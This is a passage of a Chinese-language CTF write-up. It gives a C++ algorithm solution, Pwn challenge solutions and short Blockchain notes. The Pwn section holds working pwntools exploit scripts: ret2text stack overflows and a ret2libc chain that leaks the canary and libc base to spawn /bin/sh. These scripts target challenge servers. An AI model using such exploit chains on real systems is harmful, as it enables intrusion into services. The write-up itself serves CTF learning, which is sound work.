        h[i%2][j][0] = (h[(i - 1)%2][j][1] + h[(i - 1)%2][j][0])%p;
        if(j)h[i%2][j][1] = h[(i - 1)%2][j - 1][0];
    }
    //cout<<ans<<endl;
    for (int i = 1; i <= n; i++) {
        ans = ((ans + qmi(-1, i, p) * (f[i] * (h[((n << 1) - 1)%2][i][0] + h[((n << 1) - 1)%2][i][1])) % p) + p) % p;
        //cout<<qmi(-1,i,p)<<' '<<f[i]<<' '<<h[(n<<1)-1][i][0]+h[(n<<1)-1][i][1]<<endl;
    }
    cout << ans << endl;
    return 0;
}


```



# <font style="color:#601BDE;">P</font><font style="color:#AE146E;">wn</font>
## <font style="color:#5C8D07;">Pwn 入门指北</font>
附件就是 wp，照着做就行，懒得写了。

## <font style="color:#5C8D07;">nc就行</font>
一堆指令都被删了，但是我们的 echo 还在，我们可以重定向把 flag 里面的内容搞出来。

![](../../../images/785ce931938f3904f29dd7cfcc0d7a1d.png)



## <font style="color:#5C8D07;">ret2text</font>
![](../../../images/cd47fe2973d1095187a8140e178052c9.png)

有两层，第一层是个 check，传入的内容需要等于 0xDEADBEAF。

第二层是个栈溢出，可以找到后门函数，直接 ret2text。

[!]第一层需要注意端序问题。

```python
from pwn import *
context.log_level = "debug"
p = remote("223.129.86.2",34070)
message = b'\xAF\xBE\xAD\xDE'
p.recvuntil(b"pwntools?")
p.send(message)
p.recvuntil(b"deadbeaf")
backdoor = 0x401196
ret = 0x4011B9
payload = b'A' * 32 + b'B' * 8 + p64(backdoor)
p.sendline(payload)
p.interactive()


```

![](../../../images/f1dab4dfcd0aa356f57753556ad7f68f.png)

## <font style="color:#5C8D07;">babyrust</font>
第一次做 rust pwn，很有意思。

pwn 开头的应该都是自建函数，ida 里面交叉引用看一下，发现 makefirst 函数没有被调用过。

![](../../../images/ac8e81ed56086df30b8075c3042a4b11.png)

![](../../../images/ab01dd2cd2d168afa1d0acd92ece0ff3.png)

看一下里面的逻辑，似乎是直接把 /flag 的内容读出来。

vulnerable_function 里面有栈溢出，可以直接 ret2text 到 make_first 函数，把 flag 读出来。

填充长度不太好看，这里偷懒直接爆破了，试出来是 216 + 8。

```python
from pwn import *
context.log_level = "debug"
p = remote("223.129.86.2",34071)
backdoor = 0x43ADE0
ret = 0x43AFE7
payload = b'A' * 208 + b'B' * 8 + p64(ret) + p64(backdoor)
p.recvuntil(b'Enter your input: ')
p.sendline(payload)
p.interactive()


```

![](../../../images/7c305461b8df4c4791d6a2bb04be9d38.png)

## <font style="color:#5C8D07;">ret2libc</font>
如题，就是个 ret2libc + canary 的板子。

![](../../../images/b3ca5218fba5ef4efbbc921620cb4d1d.png)

```python
from pwn import *
p=remote("223.129.86.2",34084)
libc=ELF('./libc.so.6')
payload=b'a'*0x38+b'b'
p.sendlineafter(b'> ',str(1))
p.sendafter(b'e!\n',payload)
p.recvuntil(b'b')
canary=u64(p.recv(7).rjust(8,b'\x00'))
print(hex(canary))
heap_base=u64(p.recvuntil(b'. Do')[-17:-4].ljust(8,b'\x00'))
print(hex(heap_base))
pop_rdi_ret=0x1227
payload=b'a'*0x38+p64(canary)+p64(0)+b'\x42'
p.sendafter(b'agian?\n',b'y')
p.send(payload)
payload=b'a'*0x58
p.sendlineafter(b'> ',str(1))
p.sendafter(b'e!\n',payload)
libc_base=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-0x29d90
print(hex(libc_base))
p.sendafter(b'agian?\n',b'y')
ret_addr=libc_base+0x29139
pop_rdi_ret=libc_base+0x2a3e5
sys_addr=libc_base+libc.symbols['system']
binsh=libc_base+next(libc.search(b'/bin/sh'))
payload=b'a'*0x38+p64(canary)+p64(0)+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh)+p64(sys_addr)
p.send(payload)
p.interactive()


```

# <font style="color:#601BDE;">B</font><font style="color:#AE146E;">lockchain</font>
## <font style="color:#5C8D07;">ez_Sign</font>
里面有一堆 emoji，有个在线网站可以解。

[http://www.atoolbox.net/Tool.php?Id=937](http://www.atoolbox.net/Tool.php?Id=937)

![](../../../images/8402e345e7cd958acce9a7cd502854bb.png)



## <font style="color:#5C8D07;">Hello BlockChain！</font>
上一题的文档给了 wp 了，那我就不写了，照着做即可。



## <font style="color:#5C8D07;">Hello BlockChain 2！</font>
和 SHCTF 2023 的签到题一模一样，参考这个。

[https://luoingly.top/post/shctf-2023-blockchain-writeup/](https://luoingly.top/post/shctf-2023-blockchain-writeup/)

照着做就行了，写不动了。

## <font style="color:#5C8D07;">川大交易所</font>
非预期了，可能是没部署好。

合约地址出来以后，isSolved 就是 true，直接选 3 就有 flag 了。

## <font style="color:#5C8D07;">Gambling</font>
![](../../../images/bbb5ed588c20da03cb76edf43a1d6633.png)

GPT 秒了，部署一下合约，直接攻击。



